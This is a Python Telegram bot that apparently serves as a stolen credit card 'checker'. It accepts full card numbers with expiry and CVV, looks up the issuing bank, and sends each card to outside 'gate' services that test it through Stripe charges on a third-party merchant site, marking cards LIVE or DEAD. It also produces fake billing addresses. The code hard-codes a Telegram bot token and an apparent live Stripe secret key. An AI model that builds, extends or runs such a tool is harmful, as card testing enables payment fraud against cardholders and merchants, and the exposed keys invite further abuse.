import telebot
import httpx
import re
import random
from telebot import types
from concurrent.futures import ThreadPoolExecutor

# --- CONFIG ---
# Replace with your actual token from @BotFather
TOKEN = "8318488317:AAFDc5Nruj_wwtn7giiq38OK4auQtjX0xWU" 
bot = telebot.TeleBot(TOKEN, parse_mode="HTML")
executor = ThreadPoolExecutor(max_workers=15)

# --- BIN LOOKUP ENGINE ---
def get_bin_info(cc):
    bin_num = cc[:6]
    try:
        # Fetches Bank, Brand, and Level info
        with httpx.Client(timeout=5.0) as client:
            r = client.get(f"https://lookup.binlist.net/{bin_num}").json()
            bank = r.get('bank', {}).get('name', 'UNKNOWN')
            scheme = r.get('scheme', 'UNKNOWN').upper()
            type_cc = r.get('type', 'UNKNOWN').upper()
            country = r.get('country', {}).get('name', 'UNK')
            return f"🏦 <b>Bank:</b> {bank}\n💳 <b>Brand:</b> {scheme} - {type_cc} ({country})"
    except:
        return "🏦 <b>Bank:</b> Data Not Available"

# --- GLOBAL ADDRESS DATA ---
COUNTRIES = {
    "USA": {"flag": "🇺🇸", "city": ["New York", "Miami"], "st": "NY", "zip": "10001"},
    "UK": {"flag": "🇬🇧", "city": ["London", "Manchester"], "st": "ENG", "zip": "E1 6AN"},
    "CA": {"flag": "🇨🇦", "city": ["Toronto", "Vancouver"], "st": "ON", "zip": "M5V 2N2"},
    "IN": {"flag": "🇮🇳", "city": ["Mumbai", "Delhi"], "st": "MH", "zip": "400001"},
    "AU": {"flag": "🇦🇺", "city": ["Sydney", "Perth"], "st": "NSW", "zip": "2000"}
}

def generate_address(code):
    c = COUNTRIES.get(code, COUNTRIES["USA"])
    return (
        f"{c['flag']} <b>{code} GENERATED ADDRESS</b>\n"
        f"━━━━━━━━━━━━━━\n"
        f"👤 <b>Name:</b> <code>User_{random.randint(100,999)}</code>\n"
        f"🏠 <b>Street:</b> <code>{random.randint(10,99)} Broadway Ave</code>\n"
        f"🏙 <b>City:</b> <code>{random.choice(c['city'])}</code>\n"
        f"📮 <b>Zip:</b> <code>{c['zip']}</code>\n"
        f"━━━━━━━━━━━━━━"
    )

# --- KEYBOARDS ---
def main_menu():
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    markup.add("💳 Check Card", "🏠 Address Gen", "👤 My Profile")
    return markup

def address_keyboard():
    markup = types.InlineKeyboardMarkup(row_width=3)
    btns = [types.InlineKeyboardButton(f"{v['flag']} {k}", callback_data=f"adr|{k}") for k, v in COUNTRIES.items()]
    markup.add(*btns)
    return markup

def gate_menu(cc):
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton("⚡ SK BASED", callback_data=f"gt|sk|{cc}"),
        types.InlineKeyboardButton("🔥 AUTOSTRIPE", callback_data=f"gt|as|{cc}"),
        types.InlineKeyboardButton("🚀 CHECK BOTH", callback_data=f"gt|both|{cc}")
    )
    return markup

# --- API HELPER (Fixed for [Errno 111]) ---
def check_api(gate, cc):
    try:
        url = f"https://skbased.blinkop.online/?sk=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&amount=1&lista={cc}" if gate == "sk" else f"https://autostripe.blinkop.online/check?gateway=autostripe&key=BlackXCard&site=chiwahwah.co.nz&cc={cc}"
        
        with httpx.Client(timeout=20.0, follow_redirects=True) as client:
            resp = client.get(url)
            text = resp.text.strip().lower()
            if any(x in text for x in ["success", "approved", "cvv live"]):
                return f"✅ <b>LIVE:</b> <code>{text[:60]}</code>"
            return f"❌ <b>DEAD:</b> <code>{text[:60]}</code>"
            
    except httpx.ConnectError:
        return "⚠️ <b>GATE OFFLINE:</b> Connection Refused (API is down)."
    except Exception as e:
        return "⚠️ <b>TIMEOUT:</b> API is responding too slow."

# --- HANDLERS ---
@bot.message_handler(commands=['start'])
def welcome(message):
    bot.send_message(message.chat.id, "<b>💎 V1 Professional Checker</b>\nStatus: 🟢 System Ready", reply_markup=main_menu())

@bot.message_handler(func=lambda m: m.text == "🏠 Address Gen")
def show_addr(message):
    bot.send_message(message.chat.id, "<b>🌍 Select Country:</b>", reply_markup=address_keyboard())

@bot.message_handler(func=lambda m: m.text == "💳 Check Card")
def cc_prompt(message):
    bot.send_message(message.chat.id, "<b>📥 Send Card:</b> <code>CC|MM|YY|CVV</code>")

@bot.message_handler(func=lambda m: True)
def handle_text(message):
    cards = re.findall(r'\d{15,16}\|\d{1,2}\|\d{2,4}\|\d{3,4}', message.text)
    if cards:
        bin_data = get_bin_info(cards[0])
        bot.reply_to(message, f"💳 <b>Input:</b> <code>{cards[0]}</code>\n{bin_data}", reply_markup=gate_menu(cards[0]))

@bot.callback_query_handler(func=lambda call: True)
def query_handler(call):
    p = call.data.split("|")
    if p[0] == "adr":
        bot.edit_message_text(generate_address(p[1]), call.message.chat.id, call.message.message_id, reply_markup=address_keyboard())
    elif p[0] == "gt":
        gate, cc = p[1], p[2]
        bot.edit_message_text(f"⏳ <b>Checking...</b>\n💳 <code>{cc}</code>", call.message.chat.id, call.message.message_id)
        
        if gate == "both":
            f1, f2 = executor.submit(check_api, "sk", cc), executor.submit(check_api, "as", cc)
            res = f"<b>Gate 1:</b> {f1.result()}\n<b>Gate 2:</b> {f2.result()}"
        else:
            res = f"<b>Result:</b> {check_api(gate, cc)}"
            
        bot.edit_message_text(f"<b>🏁 Check Finished</b>\n💳 <code>{cc}</code>\n━━━━━━━━━━━━━━\n{res}\n━━━━━━━━━━━━━━", call.message.chat.id, call.message.message_id)

# Optimized polling to prevent 409 Conflict
print("✅ V1 is Live! Monitoring updates...")
bot.infinity_polling(timeout=10, long_polling_timeout=5)
